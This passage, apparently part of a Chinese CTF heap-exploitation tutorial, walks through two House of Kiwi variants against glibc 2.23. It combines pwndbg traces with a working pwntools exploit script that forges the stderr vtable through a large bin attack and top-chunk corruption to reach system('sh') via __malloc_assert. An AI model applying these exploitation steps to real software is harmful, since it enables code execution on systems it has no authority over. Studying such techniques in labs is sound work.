FD: 0x619d0404b000 —▸ 0x7db2b5f8df68 (main_arena+1096) ◂— 0x619d0404b000
BK: 0x619d0404b000 —▸ 0x7db2b5f8e628 (_IO_2_1_stderr_+200) ◂— 0xfbad2887
pwndbg> x/6gx 0x619d0404b000
0x619d0404b000: 0x0000000000000000      0x0000000000000431
0x619d0404b010: 0x00007db2b5f8df68      0x00007db2b5f8e628
0x619d0404b020: 0x0000619d0404b000      0x00007db2b5f8e618
pwndbg> p/x *(struct _IO_FILE_plus*)stderr
$1 = {
  file = {
    _flags = 0xfbad2087,
    _IO_read_ptr = 0x7db2b5f8e5e3,
    _IO_read_end = 0x7db2b5f8e5e3,
    _IO_read_base = 0x7db2b5f8e5e3,
    _IO_write_base = 0x7db2b5f8e5e3,
    _IO_write_ptr = 0x7db2b5f8e5e3,
    _IO_write_end = 0x7db2b5f8e5e3,
    _IO_buf_base = 0x7db2b5f8e5e3,
    _IO_buf_end = 0x7db2b5f8e5e4,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7db2b5f8e640,
    _fileno = 0x2,
    _flags2 = 0x0,
    _old_offset = 0xffffffffffffffff,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x7db2b5f8f790,
    _offset = 0xffffffffffffffff,
    _codecvt = 0x0,
    _wide_data = 0x7db2b5f8d660,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0x0,
    _unused2 = {0x0 <repeats 20 times>}
  },
  vtable = 0x7db2b5f8c6e0
}
pwndbg> 
```

在漏洞利用链的最终触发阶段，通过执行 **`malloc(chunks[4])`** 发起一次特定的内存分配请求。此操作是 **主动诱导堆管理器执行其内部存在缺陷的代码路径，从而将前期所有精密的堆布局与指针篡改，转化为一次确定的任意地址写入**的关键“扳机”动作。

**其核心机制、约束条件与战略目的如下：**

1.  **诱导排序逻辑的触发**：此次对 `chunks[4]` 的申请，其**请求大小（`size`）需经过精密计算**。它通常被设置为 **大于**仍留在 `unsorted bin` 中的利用载体 `chunks[2]` 的尺寸，而且又 **大于**已存在于对应 `largebins` 索引中的 `chunks[0]` 的尺寸。这个大小关系确保了：
    *   `chunks[2]` 无法直接满足此次请求。
    *   迫使堆管理器（`_int_malloc`）进入“遍历 unsorted bin 并将其中的 chunk 整理到对应 smallbin 或 largebin”的标准流程。

2.  **执行漏洞代码路径**：当堆管理器处理到 `unsorted bin` 中的 `chunks[2]` 时，由于其尺寸属于 large bin 范围，且对应索引的 large bin 中已存在 `chunks[0]`，程序会执行 **large bin 的排序插入操作**。正是在这段代码中，它会**使用已被篡改的 `chunks[2]` 的 `bk` 和 `bk_nextsize` 指针**。
    *   若 `bk` 被篡改为 `vtable - 0x10`，则执行 `bck->fd = victim` 时，会将 `victim`（`chunks[2]` 地址）写入 `(vtable - 0x10) + 0x10 = vtable`。
    *   若 `bk_nextsize` 被篡改为 `vtable - 0x20`，则执行 `victim->bk_nextsize->fd_nextsize = victim` 时，会将 `victim` 地址写入 `(vtable - 0x20) + 0x20 = vtable`。

3.  **达成利用转折点**：至此，**Large Bin Attack** 被成功触发。实现了将**一个完全可控的堆地址（`chunks[2]`）** 写入目标内存（例如一个待劫持的 `_IO_FILE_plus` 结构的 `vtable` 指针位置）。这标志着利用链从“准备”进入了“执行”阶段。

因此，“申请 `chunks[4]` 触发 large bin attack” 是整个利用链中**将理论漏洞转化为实际内存破坏的、必不可少的驱动操作**。它并非为了获取 `chunks[4]` 这块内存的使用权，而是通过一次合法的分配请求，精确地“扣动扳机”，诱使堆管理器执行存在缺陷的指针更新逻辑，从而完成一次高价值的任意地址写，为后续劫持控制流铺平道路。

```bash
pwndbg> p/x *(struct _IO_FILE_plus*)stderr
$2 = {
  file = {
    _flags = 0xfbad2087,
    _IO_read_ptr = 0x7db2b5f8e5e3,
    _IO_read_end = 0x7db2b5f8e5e3,
    _IO_read_base = 0x7db2b5f8e5e3,
    _IO_write_base = 0x7db2b5f8e5e3,
    _IO_write_ptr = 0x7db2b5f8e5e3,
    _IO_write_end = 0x7db2b5f8e5e3,
    _IO_buf_base = 0x7db2b5f8e5e3,
    _IO_buf_end = 0x7db2b5f8e5e4,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7db2b5f8e640,
    _fileno = 0x2,
    _flags2 = 0x0,
    _old_offset = 0xffffffffffffffff,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x7db2b5f8f790,
    _offset = 0xffffffffffffffff,
    _codecvt = 0x0,
    _wide_data = 0x7db2b5f8d660,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0x0,
    _unused2 = {0x0 <repeats 20 times>}
  },
  vtable = 0x619d0404b940
}
pwndbg> 
```

在成功通过 **Large Bin Attack** 将目标虚表（`vtable`）指针覆盖为可控堆块 `chunks[2]` 的地址后，利用链进入了最为关键的**代码执行路径伪造阶段**。随即在 `chunks[2]` 所指向的堆内存区域中，**精心构造一个完全可控的伪造虚表（`vtable`）结构**。

```bash
pwndbg> p/x *(struct _IO_jump_t*)0x619d0404b940
$3 = {
  __dummy = 0x0,
  __dummy2 = 0x411,
  __finish = 0x0,
  __overflow = 0x7db2b5c6ca11,
  __underflow = 0x0,
  __uflow = 0x0,
  __pbackfail = 0x0,
  __xsputn = 0x7db2b5c6bcfb,
  __xsgetn = 0x0,
  __seekoff = 0x0,
  __seekpos = 0x0,
  __setbuf = 0x0,
  __sync = 0x619cfbf4c779,
  __doallocate = 0x0,
  __read = 0x0,
  __write = 0x7db2b5c6bc56,
  __seek = 0x0,
  __close = 0x0,
  __stat = 0x0,
  __showmanyc = 0x0,
  __imbue = 0x0
}
pwndbg> x/6i 0x619cfbf4c779
   0x619cfbf4c779 <magic>:      endbr64
   0x619cfbf4c77d <magic+4>:    push   rbp
   0x619cfbf4c77e <magic+5>:    mov    rbp,rsp
   0x619cfbf4c781 <magic+8>:    lea    rax,[rip+0x949]        # 0x619cfbf4d0d1
   0x619cfbf4c788 <magic+15>:   mov    rdi,rax
   0x619cfbf4c78b <magic+18>:   call   0x619cfbf4c180 <system@plt>
pwndbg> 
```

在漏洞利用链的关键触发阶段，通过堆溢出等原漏洞，**恶意篡改 Top Chunk 的 `size` 字段**，将其修改为一个较小的值（例如 `0x1000`）。Top Chunk 是堆内存中位于所有已分配块顶部的特殊块，其 `size` 字段标识了当前堆上可用的连续空闲内存总量。篡改此值旨在**人为制造一个“堆空间不足”的假象**。

随后，立即发起一次内存分配请求，申请一个**明显大于此伪造 `size` 的内存块**（例如 `0x1200`）。当堆分配器（`_int_malloc`）处理此请求时，会检查 Top Chunk 的当前大小。由于请求大小（`0x1200`）超过了被篡改后的 Top Chunk 尺寸（`0x1000`），分配器判定无法从当前堆空间满足需求。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3828
   3822 
   3823       /*
   3824          Otherwise, relay to handle system-dependent cases
   3825        */
   3826       else
   3827         {
 ► 3828           void *p = sysmalloc (nb, av);
 
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:2392
   2386 
   2387   /*
   2388      If not the first time through, we require old_size to be
   2389      at least MINSIZE and to have prev_inuse set.
   2390    */
   2391 
 ► 2392   assert ((old_top == initial_top (av) && old_size == 0) ||
   2393           ((unsigned long) (old_size) >= MINSIZE &&
   2394            prev_inuse (old_top) &&
   2395            ((unsigned long) old_end & (pagesize - 1)) == 0));
 
pwndbg> top-chunk 
Top chunk
Addr: 0x619d0404c770
Size: 0x1000 (with flag bits: 0x1000)

pwndbg> 
```

此时代码执行流将进入 `sysmalloc` 函数，该函数负责通过 `brk` 或 `mmap` 系统调用向操作系统申请扩展堆内存。在 `sysmalloc` 的某些执行路径中，特别是在尝试使用现有 Top Chunk 或检查其状态时，如果检测到 Top Chunk 的 `size` 字段异常（例如，过小或标志位无效），可能会触发一个内部断言失败。

**其最终目的是触发 `__malloc_assert` 函数**。该函数是 Glibc 中处理堆分配器内部严重断言错误的例程。一旦被调用，它会打印错误信息并通常导致程序终止。在高级漏洞利用中，并不希望程序崩溃，而是旨在**劫持 `__malloc_assert` 调用后的错误处理流程**。

```bash
290 static void
291 __malloc_assert (const char *assertion, const char *file, unsigned int line,
292                  const char *function)
► 293 {
294   (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
295                      __progname, __progname[0] ? ": " : "",
296                      file, line,
297                      function ? function : "", function ? ": " : "",
298                      assertion);
299   fflush (stderr); <= target
300   abort ();
```

若要进入 `fflush` 函数的预期路径并成功触发恶意虚表（vtable）调用，必须**确保程序执行流能顺利通过 `__fxprintf` 函数内部对 `_IO_FILE` 结构的一系列严格校验**。这些校验旨在检测和阻止对已损坏或遭篡改的 `_IO_FILE` 结构的非法操作。

```bash
In file: /home/bogon/workSpaces/glibc/stdio-common/fxprintf.c:50
   42       for (size_t i = 0; i < len; ++i)
   43         {
   44           assert (isascii (fmt[i]));
   45           wfmt[i] = fmt[i];
   46         }
   47       res = __vfwprintf (fp, wfmt, ap);
   48     }
   49   else
 ► 50     res = _IO_vfprintf (fp, fmt, ap);
```

在漏洞利用链的深入执行阶段，控制流成功进入 `_IO_vfprintf` 函数内部。此函数是 glibc 中实现核心格式化输出（`vfprintf` 系列）的关键内部例程，负责解析格式字符串并将格式化后的字节序列写入指定的 `_IO_FILE` 流对象。

```bash
In file: /home/bogon/workSpaces/glibc/stdio-common/vfprintf.c:1293
   1287     return EOF;
   1288 #endif
   1289 
   1290   if (UNBUFFERED_P (s))
   1291     /* Use a helper function which will allocate a local temporary buffer
   1292        for the stream and then call us again.  */
 ► 1293     return buffered_vfprintf (s, format, ap);
```

控制流从 `_IO_vfprintf` 进一步进入其内部的 **`buffered_vfprintf` 函数**。此函数是 glibc 格式化输出流水线中的一个关键内部例程，专门为**缓冲式输出**场景进行了优化。

```bash
In file: /home/bogon/workSpaces/glibc/stdio-common/vfprintf.c:2341
   2335           != to_flush)
   2336         result = -1;
   2337     }
   2338 #else
   2339   if ((to_flush = hp->_IO_write_ptr - hp->_IO_write_base) > 0)
   2340     {
 ► 2341       if ((int) _IO_sputn (s, hp->_IO_write_base, to_flush) != to_flush)
 

  0x7db2b5c46557 <buffered_vfprintf+352>    mov    rax, qword ptr [rbx + 0xd8]     RAX, [_IO_2_1_stderr_+216] => 0x619d0404b940 ◂— 0
  0x7db2b5c4655e <buffered_vfprintf+359>    movsxd rdx, ebp                        RDX => 0xdb
  0x7db2b5c46561 <buffered_vfprintf+362>    mov    rdi, rbx                        RDI => 0x7db2b5f8e560 (_IO_2_1_stderr_) ◂— 0xfbad2087
► 0x7db2b5c46564 <buffered_vfprintf+365>    call   qword ptr [rax + 0x38]      <__GI__IO_file_xsputn>
            rdi: 0x7db2b5f8e560 (_IO_2_1_stderr_) ◂— 0xfbad2087
            rsi: 0x7ffceb6c8390 {buf} ◂— 0x203a7972616e6962 ('binary: ')
            rdx: 0xdb
            
pwndbg> p/x *(struct _IO_jump_t*)$rax
$10 = {
  __dummy = 0x0,
  __dummy2 = 0x411,
  __finish = 0x0,
  __overflow = 0x7db2b5c6ca11,
  __underflow = 0x0,
  __uflow = 0x0,
  __pbackfail = 0x0,
  __xsputn = 0x7db2b5c6bcfb,
  __xsgetn = 0x0,
  __seekoff = 0x0,
  __seekpos = 0x0,
  __setbuf = 0x0,
  __sync = 0x619cfbf4c779,
  __doallocate = 0x0,
  __read = 0x0,
  __write = 0x7db2b5c6bc56,
  __seek = 0x0,
  __close = 0x0,
  __stat = 0x0,
  __showmanyc = 0x0,
  __imbue = 0x0
}
pwndbg> 
```

如若将伪造的`vtable->__xsputn`修改为one_gadget，此时便可获取shell的控制权。这里便是要绕过的校验之一，进入`__GI__IO_file_xsputn`之后，很快遇到第二个的校验。

```bash
In file: /home/bogon/workSpaces/glibc/libio/fileops.c:1331
   1325       to_do -= count;
   1326     }
   1327   if (to_do + must_flush > 0)
   1328     {
   1329       _IO_size_t block_size, do_write;
   1330       /* Next flush the (full) buffer. */
 ► 1331       if (_IO_OVERFLOW (f, EOF) == EOF)
```

如若将伪造的`vtable->__overflow`修改为one_gadget，此时便可获取shell的控制权。不过，前提`vtable->__xsputn`要还原为正常。

```bash
In file: /home/bogon/workSpaces/glibc/libio/fileops.c:518
   512       _IO_off64_t new_pos
   513         = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
   514       if (new_pos == _IO_pos_BAD)
   515         return 0;
   516       fp->_offset = new_pos;
   517     }
 ► 518   count = _IO_SYSWRITE (fp, data, to_do);
```

这里便是最后的一个校验，如若将伪造的`vtable->__write`修改为one_gadget，此时便可获取shell的控制权。不过，前提`vtable->__xsputn`与`vtable->__overflow`要还原为正常。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:299
   293 {
   294   (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
   295                      __progname, __progname[0] ? ": " : "",
   296                      file, line,
   297                      function ? function : "", function ? ": " : "",
   298                      assertion);
 ► 299   fflush (stderr);
 
In file: /home/bogon/workSpaces/glibc/libio/iofflush.c:40
   34     return _IO_flush_all ();
   35   else
   36     {
   37       int result;
   38       CHECK_FILE (fp, EOF);
   39       _IO_acquire_lock (fp);
 ► 40       result = _IO_SYNC (fp) ? EOF : 0;
```

在成功绕过 `__fxprintf` 函数对 `_IO_FILE` 结构体（例如伪造的 `stderr`）的内部状态校验（如确保 `_IO_write_ptr` 与 `_IO_write_end` 有效且满足 `_IO_write_ptr > _IO_write_base` 等条件）后，程序的错误处理执行流得以继续深入。

随后，控制流会经过 `_IO_vfprintf`、`buffered_vfprintf` 等一系列内部格式化输出函数。最终，在需要将缓冲数据实际提交（同步）到文件描述符时，会调用该 `_IO_FILE` 流虚表（vtable）中指定的同步函数 `_IO_SYNC`。

这正是整个利用链预设的**最终劫持点**。在前期的利用步骤（如 **Large Bin Attack**）中，已经将目标 `_IO_FILE` 流（例如 `stderr`）的虚表指针覆盖为一个指向伪造虚表的地址。在此伪造的虚表中，`_IO_SYNC` 对应的函数指针已被修改为 **one_gadget** 的地址。

因此，当程序正常调用 `_IO_SYNC` 时，其控制流被重定向至 one_gadget 的指令序列。在理想的堆布局与寄存器状态下，该 one_gadget 成功执行 `execve(“/bin/sh”, …)`，从而**获取了一个新的 shell 进程的控制权**。

#### 小结

本方法涉及四个函数指针的布局，因此出现四次利用机会。


### 1-28 house of kiwi其二

本方法一种高难度的漏洞利用技术，与“House of Orange”同属 **堆内存破坏（Heap）与输入/输出流（IO_FILE）劫持相结合** 的利用范式。其核心目标均是**通过篡改Glibc的IO子系统数据结构来劫持控制流**，但在利用目标与触发路径的设计上存在显著差异。

本方法（House of Kiwi 其二）的**核心机理**在于：首先利用堆漏洞获取**任意地址写**能力，随后用此能力**伪造标准错误流`stderr`（即`_IO_2_1_stderr_`结构体）的虚表（vtable）**，并将其中关键的函数指针覆盖为目标地址（如`system`或`one_gadget`）。

**与House of Orange的主要区别**：
*   **利用目标**：House of Orange通常专注于劫持`_IO_list_all`链表，并利用`_IO_str_overflow`等虚函数触发。而本方法则直接针对 **`stderr`这个具体、高频使用的全局流对象**。
*   **触发路径**：本方法的触发链为：`__malloc_assert` -> `__fxprintf` -> `outstring`。这条路径利用了Glibc在报告内部致命错误时的特定行为。

**触发链的详细拆解**：
1.  **诱发断言**：通过制造堆 corruption（如`double free`）触发`malloc_printerr`，进而调用`__malloc_assert`。这是错误的起点。
2.  **格式化输出**：`__malloc_assert`调用`__fxprintf`函数，旨在将错误信息字符串格式化输出到`stderr`。
3.  **关键派发**：`__fxprintf`内部在输出字符串时，会调用`outstring`等内部例程。最终，写入操作会通过`stderr`的虚表（`vtable`）进行派发，寻找执行实际写入的函数（例如`_IO_new_file_xsputn`或其等效函数）。
4.  **劫持发生**：由于已提前将`stderr`的虚表指针篡改为一个 **伪造的vtable**，并将伪造vtable中对应的写入函数指针项（具体取决于glibc版本和代码路径）设置为恶意地址，此次派发将导致**控制流被劫持**，跳转至预设的代码，从而完成利用。

**技术要点**：成功的利用还需确保伪造的`stderr`结构体能通过`__fxprintf`内部对`_IO_FILE`字段（如`_IO_write_ptr`、`_IO_write_end`）的校验，以模拟一个“可写”的流状态，从而确保执行流能顺利抵达虚函数调用点。

因此，本方法是**通过精准劫持`stderr`的虚表，并利用堆断言失败触发的、确定的格式化输出路径**来实现代码执行的一种技术。它规避了`_IO_list_all`遍历的不确定性，提供了一条在特定错误场景下非常可靠的利用途径。

```c
/* The function itself.  */
int
vfprintf (FILE *s, const CHAR_T *format, va_list ap)
{
...
  /* Lock stream.  */
  _IO_cleanup_region_start ((void (*) (void *)) &_IO_funlockfile, s);
  _IO_flockfile (s);

  /* Write the literal text before the first format.  */
  outstring ((const UCHAR_T *) format,
	     lead_str_end - (const UCHAR_T *) format);
}
```

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/17/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_kiwi_again/exploit.py)。

核心利用代码如下：

```python
# house of kiwi again
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
log.info(f"libc base: {hex(libc.address)}")
system = libc.sym["system"]
log.info(f"system addr: {hex(system)}")
# pwndbg> x/1gx &stderr
# 0x4040a0 <stderr@GLIBC_2.2.5>:  0x00007e2262f8e560
# pwndbg>
stderr = 0x4040A0
log.info(f"stderr addr: {hex(stderr)}")

payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 4].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(stderr - 0x10)
payload += p64(chunk0_addr) + p64(stderr - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)

payload = b"\x00" * 0x500 + b"\x20\x80||sh\x00\x00"
edit(1, len(payload), payload)
payload = b"\x00" * (0xD8 - 0x10) + p64(chunk0_addr)
edit(2, len(payload), payload)
payload = b"\x00" * (0x38 - 0x10) + p64(system)
edit(0, len(payload), payload)
payload = b"\x00" * 0x500 + p64(0) + p64(0x1000)
edit(4, len(payload), payload)
malloc(5, 0x1200)
conn.recvline()
cmd = b"cat src/2.23/house_of_kiwi_again/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在漏洞利用链的起始阶段，通过精心运用 **Large Bin Attack** 技术，旨在实现双重关键信息的泄露：**Libc库的基地址**与**堆（Heap）内存的起始地址**。此技术利用glibc堆分配器中Large Bin管理机制的特定逻辑缺陷，通过操纵特定堆块（chunk）的元数据，诱导分配器在执行内部链表排序操作时，将关键地址信息暴露在可读的内存区域。

```bash
pwndbg> heap
Free chunk (largebins) | PREV_INUSE
Addr: 0x23fd2000
Size: 0x430 (with flag bits: 0x431)
fd: 0x767f8a38df68
bk: 0x767f8a38df68
fd_nextsize: 0x23fd2000
bk_nextsize: 0x23fd2000

Allocated chunk
Addr: 0x23fd2430
Size: 0x510 (with flag bits: 0x510)

Allocated chunk | PREV_INUSE
Addr: 0x23fd2940
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x23fd2d50
Size: 0x510 (with flag bits: 0x511)

Top chunk | PREV_INUSE
Addr: 0x23fd3260
Size: 0x1fda0 (with flag bits: 0x1fda1)

pwndbg> largebins 
largebins
0x400-0x430: 0x23fd2000 —▸ 0x767f8a38df68 (main_arena+1096) ◂— 0x23fd2000
pwndbg> 
```

在高级堆漏洞利用中，修改 large bin 中特定 chunk 的 `bk`（后向指针）和 `bk_nextsize`（指向下一个不同大小 chunk 的指针）是一项至关重要的利用准备动作。此操作并非简单的数据改写，而是对 glibc 堆分配器内部数据结构的一次精密手术，旨在为后续触发 **Large Bin Attack** 实现任意地址写入（Write-What-Where）奠定基础。

**操作目的与原理：**

1.  **劫持链表操作逻辑**：Large Bin 通过 `bk` 和 `bk_nextsize` 指针维护着两个维度的链表关系。`bk` 是常规双向链表的一部分，连接着相同大小的 chunk；而 `bk_nextsize` 则用于连接不同大小的 chunk，形成一个按大小降序排列的“大小链”，以提高大块内存的搜索效率。篡改这些指针，实质上是**污染了堆管理器的内部视图**，诱导其在后续执行链表插入、删除或排序等操作时，遵循预设的恶意路径。

2.  **为任意地址写预设目标**：Large Bin Attack 的核心漏洞在于，当将一个 chunk 从 unsorted bin 整理并插入到非空的 large bin 时，glibc 会执行以下两处缺乏充分校验的指针操作（以 glibc 2.23 为例）：
    *   `victim->bk_nextsize->fd_nextsize = victim;`
    *   `bck->fd = victim;`

    通过提前修改目标 chunk（即后续的 `victim`）的 `bk` 和 `bk_nextsize`，可以控制上述赋值语句左侧解引用的地址。具体而言：
      *   将 `bk` 修改为 **`目标地址 - 0x10`**，则 `bck->fd` 的写入位置将是 `目标地址`。
      *   将 `bk_nextsize` 修改为 **`目标地址 - 0x20`**，则 `victim->bk_nextsize->fd_nextsize` 的写入位置也将是 `目标地址`。

```bash
pwndbg> largebins 
largebins
0x400-0x430 [corrupted]
FD: 0x23fd2000 —▸ 0x767f8a38df68 (main_arena+1096) ◂— 0x23fd2000
BK: 0x23fd2000 —▸ 0x404090 (stdin@GLIBC_2.2.5) ◂— 0
pwndbg> x/6gx 0x23fd2000
0x23fd2000:     0x0000000000000000      0x0000000000000431
0x23fd2010:     0x0000767f8a38df68      0x0000000000404090
0x23fd2020:     0x0000000023fd2000      0x0000000000404080
pwndbg> x/1gx &stderr
0x4040a0 <stderr@GLIBC_2.2.5>:  0x0000767f8a38e560
pwndbg> 
```

在漏洞利用链的最终触发阶段，通过发起一次**特定大小的内存分配请求**（例如调用 `malloc` 申请新的 `chunks`）来主动驱动利用。此操作是**将前期所有精密的堆布局与指针篡改转化为实际漏洞利用的关键“扳机”动作**。

**其核心机制如下：**

此次分配的**请求大小（`size`）需经过精密计算**，通常被设置为一个能同时满足以下两个条件值：
1.  **大于**仍留在 `unsorted bin` 的尺寸。
2.  **大于**已存在于目标 `largebins` 的另一个chunk的尺寸。

这个特定的尺寸关系确保了堆管理器（`_int_malloc`）在遍历 `unsorted bin` 时，**无法**直接使用被篡改的victim chunk来满足此次请求，从而迫使执行流进入“将unsorted bin中的chunk整理并插入对应large bin”的代码路径。

**触发漏洞的代码路径：**
当victim chunk因其尺寸属于large bin范围而被处理时，堆管理器会执行large bin的排序插入逻辑。在此过程中，它将**使用被恶意篡改的 `bk` 和 `bk_nextsize` 指针**。根据Glibc特定版本（如2.23）的代码缺陷，会执行以下关键操作：
*   **`bck->fd = victim`**：此处的 `bck` 来源于被篡改的 `bk` 指针。若 `bk` 被设置为 `目标地址 - 0x10`，此操作会将 `victim`（即可控的堆地址）写入 `目标地址`。
*   **`victim->bk_nextsize->fd_nextsize = victim`**：同理，若 `bk_nextsize` 被设置为 `目标地址 - 0x20`，此操作也会将 `victim` 地址写入 `目标地址`。

```bash
pwndbg> x/1gx &stderr
0x4040a0 <stderr@GLIBC_2.2.5>:  0x0000000023fd2940
pwndbg> 
```

在成功通过 **Large Bin Attack** 等技术将标准错误流 `stderr`（即 `_IO_2_1_stderr_` 全局结构）的指针修改为指向一个可控的堆地址（例如 `chunks[2]`）之后，利用链进入了**控制流劫持的最终构造阶段**。随即在该可控堆地址上，**精心布局一个完全由自定义的伪造虚表（fake vtable）**。

```bash
pwndbg> p/x *(struct _IO_FILE_plus*)stderr
$1 = {
  file = {
    _flags = 0x7c7c8020,
    _IO_read_ptr = 0x411,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0x0,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x0,
    _offset = 0x0,
    _codecvt = 0x0,
    _wide_data = 0x0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0x0,
    _unused2 = {0x0 <repeats 20 times>}
  },
  vtable = 0x23fd2000
}
pwndbg> x/s stderr
0x23fd2940:     " \200||sh"
pwndbg> p/x *(struct _IO_jump_t*)0x23fd2000
$2 = {
  __dummy = 0x0,
  __dummy2 = 0x431,
  __finish = 0x0,
  __overflow = 0x0,
  __underflow = 0x0,
  __uflow = 0x0,
  __pbackfail = 0x0,
  __xsputn = 0x767f8a03c3eb,
  __xsgetn = 0x0,
  __seekoff = 0x0,
  __seekpos = 0x0,
  __setbuf = 0x0,
  __sync = 0x0,
  __doallocate = 0x0,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x0,
  __close = 0x0,
  __stat = 0x0,
  __showmanyc = 0x0,
  __imbue = 0x0
}
pwndbg> x/5i 0x767f8a03c3eb
   0x767f8a03c3eb <__libc_system>:      sub    rsp,0x8
   0x767f8a03c3ef <__libc_system+4>:    test   rdi,rdi
   0x767f8a03c3f2 <__libc_system+7>:    jne    0x767f8a03c40a <__libc_system+31>
   0x767f8a03c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x767f8a156d7b
   0x767f8a03c3fb <__libc_system+16>:   call   0x767f8a03be36 <do_system>
pwndbg> 
```

在漏洞利用链的触发阶段，首先通过堆溢出等原语，**恶意篡改Top Chunk的`size`字段**，将其设置为一个远小于实际可用空间的较小值（例如`0x1000`）。Top Chunk是堆内存中位于所有已分配块末尾的特殊块，其`size`字段标识了当前堆上可扩展的连续空闲内存总量。篡改此值旨在**人为制造一个“堆空间即将耗尽”的虚假状态**。

随后，立即发起一次**超过此伪造尺寸的内存分配请求**（例如申请`0x1200`字节）。当堆分配器（`_int_malloc`）处理此请求时，会检查Top Chunk的当前大小。由于请求大小（`0x1200`）超过了被篡改后的Top Chunk尺寸（`0x1000`），分配器判定无法从现有堆空间满足此次分配。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3828
   3822 
   3823       /*
   3824          Otherwise, relay to handle system-dependent cases
   3825        */
   3826       else
   3827         {
 ► 3828           void *p = sysmalloc (nb, av);
 
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:2392
   2386 
   2387   /*
   2388      If not the first time through, we require old_size to be
   2389      at least MINSIZE and to have prev_inuse set.
   2390    */
   2391 
 ► 2392   assert ((old_top == initial_top (av) && old_size == 0) ||
   2393           ((unsigned long) (old_size) >= MINSIZE &&
   2394            prev_inuse (old_top) &&
   2395            ((unsigned long) old_end & (pagesize - 1)) == 0));
 
pwndbg> top-chunk 
Top chunk
Addr: 0x23fd3770
Size: 0x1000 (with flag bits: 0x1000)

pwndbg> 
```

此时代码执行流将进入`sysmalloc`函数，该函数负责通过系统调用扩展堆内存。在`sysmalloc`的某些执行路径中，特别是在检查旧Top Chunk的状态或尝试扩展堆时，如果检测到Top Chunk的`size`字段异常（例如，其值过小或包含无效的标志位），或扩展操作因其他原因失败，可能会触发一个内部的断言（assertion）错误。

**其最终目的正是触发`__malloc_assert`函数的调用**。该函数是glibc中处理堆分配器内部严重错误的专用例程。在高级漏洞利用中，并非期望程序简单崩溃，而是旨在**主动诱导程序进入`__malloc_assert`所引发的错误处理流程**。该流程通常会尝试输出详细的错误信息至标准错误流（`stderr`）。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:294
   288 extern const char *__progname;
   289 
   290 static void
   291 __malloc_assert (const char *assertion, const char *file, unsigned int line,
   292                  const char *function)
   293 {
 ► 294   (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
   295                      __progname, __progname[0] ? ": " : "",
   296                      file, line,
   297                      function ? function : "", function ? ": " : "",
   298                      assertion);
   299   fflush (stderr);
   300   abort ();
   301 }
```

在利用链的关键执行阶段，控制流从 `__fxprintf` 成功步进至其核心底层函数 **`_IO_vfprintf`（`vfprintf` 的内部实现）**。此步进标志着程序从处理错误信息的初步准备，深入到实际的格式化输出逻辑，是利用链中一个至关重要的技术节点。

```bash
In file: /home/bogon/workSpaces/glibc/stdio-common/vfprintf.c:1320
   1314 
   1315   /* Lock stream.  */
   1316   _IO_cleanup_region_start ((void (*) (void *)) &_IO_funlockfile, s);
   1317   _IO_flockfile (s);
   1318 
   1319   /* Write the literal text before the first format.  */
 ► 1320   outstring ((const UCHAR_T *) format,
   1321              lead_str_end - (const UCHAR_T *) format);
 
pwndbg> x/s $rdi
0x27eb8940:     " \200||sh"
pwndbg>
```

其中outstring宏实际内容如下：

```c
#define outstring(String, Len)                                                 \
  do {                                                                         \
    assert((size_t)done <= (size_t)INT_MAX);                                   \
    if ((size_t)PUT(s, (String), (Len)) != (size_t)(Len)) {                    \
      done = -1;                                                               \
      goto all_done;                                                           \
    }                                                                          \
    if (__glibc_unlikely(INT_MAX - done < (Len))) {                            \
